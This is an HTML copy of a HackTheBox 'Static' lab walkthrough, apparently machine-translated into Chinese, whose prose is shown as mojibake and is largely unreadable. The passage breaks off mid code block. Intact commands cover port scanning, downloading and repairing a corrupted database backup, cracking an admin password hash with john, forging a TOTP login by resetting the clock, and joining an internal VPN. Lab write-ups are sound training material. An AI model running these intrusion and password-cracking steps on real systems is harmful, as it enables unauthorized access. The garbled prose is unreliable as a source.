<html>
<head>
<title>Static from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ¥è‡ªHackTheBoxçš„é™æ€â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/static-from-hackthebox-detailed-walkthrough-355c4c98670?source=collection_archive---------1-----------------------#2021-12-19">https://infosecwriteups.com/static-from-hackthebox-detailed-walkthrough-355c4c98670?source=collection_archive---------1-----------------------#2021-12-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5c6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="662a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi lj"><img src="../Images/5ef2f6d234d3a363fa9e5ea381663445.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*K0hEwBTrMuW3RbGE.png"/></div></div></figure><p id="ac86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é™æ€æ˜¯HackTheBoxä¸Šçš„ä¸€ä¸ªç¡¬æœºå™¨ã€‚æˆ‘ä»¬ä»ç½‘ç«™ä¸Šä¸€ä¸ªåŒ…å«æŸåå¤‡ä»½çš„éšè—æ–‡ä»¶å¤¹å¼€å§‹ã€‚ä¸€æ—¦æ¢å¤ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªä¸€æ¬¡æ€§ä»£ç ï¼Œå…è®¸æˆ‘ä»¬è®¿é—®ç½‘ç«™çš„å¦ä¸€ä¸ªéšè—éƒ¨åˆ†ï¼Œè¿™æ¬¡æ˜¯ä¸€ä¸ªæ”¯æŒé—¨æˆ·ã€‚ä»è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå…è®¸æˆ‘ä»¬è¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œã€‚æˆ‘ä»¬ä½¿ç”¨Meterpreteråœ¨è¿™ä¸ªæ–°ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ä¸Šè·å¾—ä¸€ä¸ªshellï¼Œç„¶åæ‰¾åˆ°ä¸€ä¸ªç§é’¥æ¥è¿›è¡ŒSSHè®¿é—®ã€‚æšä¸¾åœ¨è¿™ä¸ªç½‘ç»œä¸Šæ‰¾åˆ°æ›´å¤šçš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬é€šè¿‡éš§é“è¿æ¥åˆ°å…¶ä¸­çš„ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¹¶åˆ©ç”¨æ¼æ´å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ç¬¬äºŒä¸ªæœºå™¨ä¸Šçš„å¦ä¸€ä¸ªåå‘å¤–å£³ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬å¼€å‘äº†ä¸€ä¸ªç¼–ç å¾ˆå·®çš„å®šåˆ¶åº”ç”¨ç¨‹åºï¼Œå¹¶æœ€ç»ˆè·å¾—äº†rootã€‚</p><p id="1025" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯å¹¿æ³›çš„åˆ—ä¸¾å’Œç ”ç©¶æŠ€èƒ½ï¼Œä»¥å‘ç°å’Œåˆ©ç”¨é”™è¯¯é…ç½®ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯ä½¿ç”¨æœ¬æœºå‘½ä»¤æšä¸¾å’Œç§»åŠ¨æ–‡ä»¶ã€‚ä½¿ç”¨Meterpreterï¼Œpspy64ï¼Œç«¯å£è½¬å‘ç­‰ç­‰ã€‚</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/355" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">ç ´è§£ç›’å­::æ¸—é€æµ‹è¯•å®éªŒå®¤â€”é™æ€</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lt ly"/></div></div></a></div><h1 id="d8c3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="f094" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="7d92" class="mx km iq mt b gy my mz l na nb">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.246 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) <br/><br/>nmap -p$ports -sC -sV -oA static 10.10.10.246</span></pre><p id="8337" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç»“æœ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nc"><img src="../Images/1a96c7c5216a72a10e6a617f7b43b70c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fyLuz3bpXloIqoSynP3Vpg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Nmapæ‰«æ</figcaption></figure><p id="4b3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸‰ä¸ªå¼€æ”¾çš„æ¸¯å£ã€‚æˆ‘ä»¬åœ¨22å’Œ2222ä¸Šéƒ½æœ‰OpenSSHï¼Œå®ƒä»¬ä¹Ÿæ˜¯ä¸åŒçš„ç‰ˆæœ¬ï¼Œè¿™å¾ˆæœ‰è¶£ã€‚æˆ‘ä»¬åœ¨8080ä¸Šä¹Ÿæœ‰Apacheï¼Œè¿™æ˜¯æˆ‘ä»¬çš„èµ·ç‚¹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/339e30d36b3229bdd7d4bbdb9299959d.png" data-original-src="https://miro.medium.com/v2/resize:fit:642/format:webp/0*oH-h8MLzJnrkOIGr.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ç«¯å£8080ä¸Šçš„é™æ€ç½‘ç«™</figcaption></figure><p id="5be9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åœ¨é‚£é‡Œä»€ä¹ˆä¹Ÿæ²¡æ‰¾åˆ°ã€‚å›å¤´çœ‹ä¸Šé¢çš„Nmapæ‰«æï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªæ¡ç›®çš„robots.txtæ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç”¨æ—‹åº¦æ¥ç¡®è®¤:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="194a" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# curl http://static.htb:8080/robots.txt <br/>User-agent: *<br/>Disallow: /vpn/<br/>Disallow: /.ftp_uploads/</span></pre><h1 id="c3a0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">VPNç™»å½•é¡µé¢</h1><p id="0dff" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">å›åˆ°æµè§ˆå™¨æ¥è¯•è¯•è¿™äº›ã€‚/vpn/ first:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/ad6b3ae2478a52c33b2dd3d3e291624c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/0*QXaZX8FB5wFW-FJO.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">VPNç™»å½•é¡µé¢</figcaption></figure><p id="f8e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ä¸€ä¸ªç™»å½•é¡µé¢ã€‚å°è¯•æ˜æ˜¾çš„å‡­è¯å¯¹admin: adminæœ‰æ•ˆï¼Œæˆ‘ä»¬åˆ°è¾¾è¿™é‡Œ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/0c7740f302170aa0f82b7fc053cda225.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/0*pJ2EDuOmB0w553s_.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">VPNåŒå› ç´ ä¸€æ¬¡æ€§å¯†ç </figcaption></figure><h1 id="6f81" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">FTPå¤‡ä»½æ–‡ä»¶</h1><p id="7387" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªæ­»èƒ¡åŒï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰æƒ…æŠ¥æ‰¾åˆ°ä¸€æ¡é€šè¿‡é‚£é“å±éšœçš„è·¯ã€‚è®©æˆ‘ä»¬è¯•è¯•å¦ä¸€ä¸ªç½‘å€:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nk"><img src="../Images/89907c8424d8f61984547b720b73e8fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:888/format:webp/0*eZMirPT0avUkqMlG.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ftpä¸Šä¼ æ–‡ä»¶å¤¹</figcaption></figure><p id="bb23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ä¸¤ä»½æ–‡ä»¶ã€‚ä¸€ä¸ªwarning.txtå’Œä¸€ä¸ªgzipå­˜æ¡£ã€‚æˆ‘ä»¬å¯ä»¥è¯»å–txtæ–‡ä»¶:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="73af" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# curl http://static.htb:8080//.ftp_uploads/warning.txt<br/>Binary files are being corrupted during transfer!!! <br/>Check if are recoverable.</span></pre><p id="863c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€ä¸ªæç¤ºï¼Œå…¶ä»–æ–‡ä»¶éœ€è¦æ¢å¤ï¼Œç„¶åæˆ‘ä»¬æ‰èƒ½gunzipå®ƒã€‚æŠ“ä½å®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a857" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# wget http://static.htb:8080//.ftp_uploads/db.sql.gz   <br/>--2021-11-01 22:36:55--  http://static.htb:8080//.ftp_uploads/db.sql.gz<br/>Resolving static.htb (static.htb)... 10.10.10.246<br/>Connecting to static.htb (static.htb)|10.10.10.246|:8080... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 262 [application/x-gzip]<br/>Saving to: â€˜db.sql.gzâ€™<br/>db.sql.gz           100%[==================&gt;]     262  --.-KB/s    in 0s      <br/>2021-11-01 22:36:55 (50.4 MB/s) - â€˜db.sql.gzâ€™ saved [262/262]</span></pre><p id="bba4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é¦–å…ˆæ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å¯ä»¥gunzip:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a13a" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# gunzip db.sql.gz<br/>gzip: db.sql.gz: invalid compressed data--crc error<br/>gzip: db.sql.gz: invalid compressed data--length error</span></pre><p id="36f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½å§ï¼Œä»–ä»¬æ²¡æœ‰è¯´è°ï¼æœç´¢ä¿®å¤æŸåçš„gzæ–‡ä»¶çš„å·¥å…·æ—¶å‘ç°äº†<a class="ae nl" href="https://github.com/arenn/gzrt" rel="noopener ugc nofollow" target="_blank"> gzrecover </a>ã€‚å…‹éš†ï¼Œåˆ¶ä½œå·¥å…·ï¼Œç„¶åæ¢å¤æ–‡ä»¶:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nc"><img src="../Images/fa329424aba9171da12eff35c7029926.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fMG1iVsFpRtHQQ7y6L5tQg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">æ­£åœ¨å°è¯•ä½¿ç”¨gzrecorveræ¢å¤æ–‡ä»¶</figcaption></figure><p id="ec45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¦ä¹ˆè¿™ä¸èµ·ä½œç”¨ï¼Œè¦ä¹ˆæ–‡ä»¶éœ€è¦åšæ›´å¤šçš„å·¥ä½œã€‚ç»è¿‡ä¸€ç•ªæŒ å¤´ä¹‹åï¼Œæˆ‘å¯»æ‰¾å¦ä¸€ä¸ªå·¥å…·ï¼Œå‘ç°<a class="ae nl" href="https://github.com/yonjar/fixgz" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>å¯ä»¥ç”¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nc"><img src="../Images/0052e9df2bd248038a21ec2b6f441334.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eV85dimWCdE9hRC7h0YFig.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">å°è¯•ä½¿ç”¨fixgzæ¢å¤æ–‡ä»¶</figcaption></figure><p id="0be9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç±»ä¼¼ä½†æ˜¯å¥½å¤šäº†ï¼ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æœ‰adminçš„ç”¨æˆ·åå’Œå¯†ç çš„æ•£åˆ—ï¼Œå¦‚æœå®ƒä¸æˆ‘ä»¬å·²ç»å°è¯•è¿‡çš„ç›¸åŒï¼Œé‚£ä¹ˆå®ƒä¹Ÿæ˜¯adminã€‚å‡ºäºå¥½å¥‡ï¼Œè®©æˆ‘ä»¬æ¥ç ´è§£å®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="86aa" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# echo "d033e22ae348aeb5660fc2140aec35850c4da997" &gt; hash.txt <br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt <br/>Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])<br/>Warning: no OpenMP support for this hash type, consider --fork=4<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>admin            (?)<br/>1g 0:00:00:00 DONE (2021-11-01 22:59) 33.33g/s 660800p/s 660800c/s 660800C/s alcala..LOVE1<br/>Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably<br/>Session completed</span></pre><p id="82dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å—¯ï¼Œè¿™å¾ˆæ˜æ˜¾ï¼Œä½†å¯¹ç»ƒä¹ æˆ‘ä»¬çš„å“ˆå¸Œç ´è§£æŠ€å·§å¾ˆæœ‰å¥½å¤„ã€‚</p><h1 id="8d74" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">TOTPæ’ä»¶</h1><p id="d804" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">å›åˆ°å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒå†™ç€totpï¼Œå¹¶ç»™äº†æˆ‘ä»¬ä¸€ä¸ªä»£ç ã€‚ä»€ä¹ˆæ˜¯TOTPï¼ŸåŸºäºæ—¶é—´çš„ä¸€æ¬¡æ€§å¯†ç ï¼Œ<a class="ae nl" href="https://www.hypr.com/time-based-time-password-totp-otp/" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œçš„</a>å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è§£é‡Šã€‚æˆ‘å‘ç°<a class="ae nl" href="https://github.com/Authenticator-Extension/Authenticator" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a> GitHub repoé“¾æ¥åˆ°ä¸€ä¸ªç«ç‹æ’ä»¶<a class="ae nl" href="https://addons.mozilla.org/en-US/firefox/addon/auth-helper/?src=external-github" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>ã€‚</p><p id="2480" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®‰è£…å®Œæˆåï¼Œç‚¹å‡»å›¾æ ‡ï¼Œç„¶åç‚¹å‡»é“…ç¬”:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/1e912f5ab837c7ac592444f7e13fe156.png" data-original-src="https://miro.medium.com/v2/resize:fit:542/format:webp/0*guYD3052Izk1sKs3.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Firefoxçš„totpéªŒè¯å™¨æ’ä»¶</figcaption></figure><p id="4912" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†æˆ‘ä»¬åœ¨ä¸Šé¢æ‰¾åˆ°çš„TOTPä»£ç æ·»åŠ åˆ°æœºå¯†å­—æ®µï¼Œç„¶åå•å‡»ç¡®å®š:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nn"><img src="../Images/496c7df2b6afd5c8828e1a845751bb34.png" data-original-src="https://miro.medium.com/v2/resize:fit:464/format:webp/0*kJKneuqR6LZmRd2W.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">æ·»åŠ å¯†ç ä»¥å¯ç”¨totp</figcaption></figure><p id="bc44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ä½ æœ‰ä¸€ä¸ªæ—‹è½¬çš„ä¸€æ¬¡æ€§ä»£ç :</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/3d861678428ed57efb35c19affc01bbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:504/format:webp/0*j-hjXB_JdGZ3-p3p.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ç¤ºä¾‹ä»£ç </figcaption></figure><p id="41dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸‹ä¸€æ­¥åº”è¯¥å¾ˆç®€å•ï¼Œä½ åªéœ€åƒä»¥å‰ä¸€æ ·ç™»å½•vpné¡µé¢ï¼Œå¹¶åœ¨2FAæ¡†ä¸­è¾“å…¥ä½ çš„å…­ä½æ•°ä»£ç ã€‚ç„¶è€Œï¼Œè¿™åªæœ‰åœ¨ä½ çš„æ”»å‡»ç®±æ—¶é—´å’Œé™æ€æœåŠ¡å™¨ç›¸åŒçš„æƒ…å†µä¸‹æ‰æœ‰æ•ˆã€‚å¯¹äºæˆ‘æ¥è¯´ï¼Œæ—¶é—´ç›¸å·®16åˆ†é’Ÿï¼Œæ‚¨å¯ä»¥ä½¿ç”¨curlæ¥è·å–è¿œç¨‹æœåŠ¡å™¨æ—¶é—´:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="78f3" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# curl -i http://10.10.10.246:8080/vpn/login.php  <br/>HTTP/1.1 200 OK<br/>Date: Tue, 02 Nov 2021 21:50:04 GMT<br/>Server: Apache/2.4.29 (Ubuntu)</span></pre><p id="f581" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åä¸å½“åœ°æ—¶é—´è¿›è¡Œæ¯”è¾ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a6da" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# date<br/>Tue Nov  2 09:34:51 PM GMT 2021</span></pre><p id="ce41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘åˆšåˆšæ›´æ”¹äº†æˆ‘çš„æœ¬åœ°æ—¶é—´ä»¥åŒ¹é…æœåŠ¡å™¨:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="6846" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# timedatectl set-time '21:50:00'</span></pre><h1 id="10ae" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ITæ”¯æŒé—¨æˆ·</h1><p id="087d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨å›åˆ°vpné¡µé¢ï¼Œå°†totpä»£ç ç²˜è´´åˆ°2FAæ¡†ä¸­ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œç»“æŸ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi np"><img src="../Images/4d574262bbc286ca50ce10bedcaf224e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/0*W0J8MecXt5hBDN0W.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ITæ”¯æŒé—¨æˆ·</figcaption></figure><p id="2d3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬ä½äºä¸€ä¸ªåŒ…å«æœåŠ¡å™¨åˆ—è¡¨çš„æ”¯æŒé—¨æˆ·ä¸­ã€‚å¦‚æœæˆ‘ä»¬åœ¨â€œå¸¸ç”¨åâ€æ¡†ä¸­é”®å…¥ä»–ä»¬çš„ä¸€ä¸ªåå­—ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸‹è½½ä¸€ä¸ªVPNè¿æ¥æ–‡ä»¶ã€‚é¦–å…ˆæˆ‘ä¸‹è½½ç½‘ç»œæœåŠ¡å™¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/683fa1819062e7340b099f4faa95f34e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/0*iROKCmnWEnQ50tAt.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ä¸‹è½½web.ovpn</figcaption></figure><p id="2f6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°è¯•ä½¿ç”¨æ–‡ä»¶è¿æ¥åˆ°å®ƒä¸èµ·ä½œç”¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nr"><img src="../Images/5b84d55975a5fae832e18cc308f81960.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xBMxQA6YH0r9uSO6orSdzg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">VPNæœªè¿æ¥</figcaption></figure><p id="ff62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŸ¥çœ‹ä¸Šé¢çš„è¿æ¥å°è¯•ï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒè¯•å›¾è®¿é—®vpn.static.htbï¼Œå› æ­¤è®©æˆ‘ä»¬å°†å®ƒæ·»åŠ åˆ°æˆ‘ä»¬çš„hostsæ–‡ä»¶ä¸­:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a0cc" class="mx km iq mt b gy my mz l na nb">sed -i '/10.10.10.246 static.htb/ s/$/ vpn.static.htb/' /etc/hosts</span></pre><p id="a694" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨å†è¯•ä¸€æ¬¡:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nr"><img src="../Images/30f0c58f72aa0f101de8a0b70ab10751.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n_jPfJmsvIuOHUNJWTrhIg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">è¿æ¥åˆ°æ–°ç½‘ç»œ</figcaption></figure><h1 id="8150" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç½‘ç»œæœåŠ¡å™¨</h1><p id="2819" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å·²è¿æ¥åˆ°æ­¤ç½‘ç»œï¼Œå¹¶æœ‰äº†æ–°çš„è°ƒè°å™¨æ¥å£:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="1553" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ifconfig tun9<br/>tun9: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500<br/>        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9<br/>        RX packets 0  bytes 0 (0.0 B)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 5  bytes 240 (240.0 B)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><p id="3fcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å³ä½¿æˆ‘ä»¬ä½¿ç”¨ä¸ºwebæœåŠ¡å™¨æä¾›çš„vpnæ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œæˆ‘ä»¬å®é™…ä¸Šä¹Ÿæ— æ³•è¿æ¥åˆ°å®ƒï¼Œå°è¯•åªæ˜¯æŒ‚èµ·:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="255f" class="mx km iq mt b gy my mz l na 